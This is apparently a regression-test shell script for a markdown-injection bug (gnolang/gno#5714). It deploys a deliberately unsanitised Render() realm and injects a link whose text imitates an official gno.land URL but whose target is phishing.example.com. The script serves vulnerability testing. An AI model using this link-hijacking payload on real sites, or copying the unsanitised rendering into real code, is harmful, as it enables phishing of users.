#!/bin/sh
# Targets: gnolang/gno#5714 — markdown injection in Render()
# Vecteur : link URL hijacking
# Démontre qu'un message utilisateur peut contenir un lien dont le texte
# ressemble à une URL officielle mais dont la destination est malicieuse.
# KNOWN VULNERABLE sur master actuel — régression attendue après fix #5714.

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=common.sh
. "$SCRIPT_DIR/common.sh"

SUFFIX=$(date +%s)
PKGPATH="gno.land/r/${KEY_ADDR}/audit/mdlink${SUFFIX}"
TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

echo "⚠️  gnolang/gno#5714 — Link URL hijacking"
echo "   Package: $PKGPATH"

# --- déploiement du realm vulnérable ---
cat > "$TMPDIR/mdlink.gno" << EOF
package mdlink

var message string

func SetMessage(m string) {
	message = m
}

func Render(_ string) string {
	return message
}
EOF

cat > "$TMPDIR/gnomod.toml" << EOF
module = "${PKGPATH}"
gno = "0.9"
EOF

echo -n "   Deploying realm... "
DEPLOY=$(echo "$PASSWORD" | gnokey maketx addpkg \
	-pkgpath "$PKGPATH" -pkgdir "$TMPDIR" \
	-gas-fee 1000000ugnot -gas-wanted 10000000 \
	-broadcast -chainid "$CHAINID" -remote "$RPC" \
	-insecure-password-stdin \
	-home "$GNOKEY_HOME" \
	"$KEY" 2>&1)
if echo "$DEPLOY" | grep -q "OK!"; then echo "OK"; else
	echo "FAILED"; echo "$DEPLOY"; exit 1
fi

# --- injection du payload malicieux ---
# Le texte affiché imite gno.land mais le href pointe vers phishing.example.com
echo -n "   Injecting hijacked link... "
INJECT=$(echo "$PASSWORD" | gnokey maketx call \
	-pkgpath "$PKGPATH" \
	-func "SetMessage" \
	-args "[https://gno.land/r/official/dao](http://phishing.example.com/steal?target=gnoland)" \
	-gas-fee 1000000ugnot -gas-wanted 5000000 \
	-broadcast -chainid "$CHAINID" -remote "$RPC" \
	-insecure-password-stdin \
	-home "$GNOKEY_HOME" \
	"$KEY" 2>&1)
if echo "$INJECT" | grep -q "OK!"; then echo "OK"; else
	echo "FAILED"; echo "$INJECT"; exit 1
fi

# --- vérification : Render() expose-t-il l'URL de phishing ? ---
echo -n "   Querying Render() (expect phishing URL present)... "
RESULT=$(gnokey query "vm/qeval" \
	-data "${PKGPATH}.Render(\"\")" \
	-remote "$RPC" 2>&1)

if echo "$RESULT" | grep -q "phishing.example.com"; then
	echo "⚠️  VULNERABLE — URL de phishing présente dans Render() (attendu sur master)"
	echo "   Référence : https://github.com/gnolang/gno/pull/5714"
	exit 1
elif echo "$RESULT" | grep -q "gno.land/r/official"; then
	echo "✅ PATCHED — URL malicieuse neutralisée"
else
	echo "⚠️  UNKNOWN OUTPUT"; echo "$RESULT"; exit 1
fi
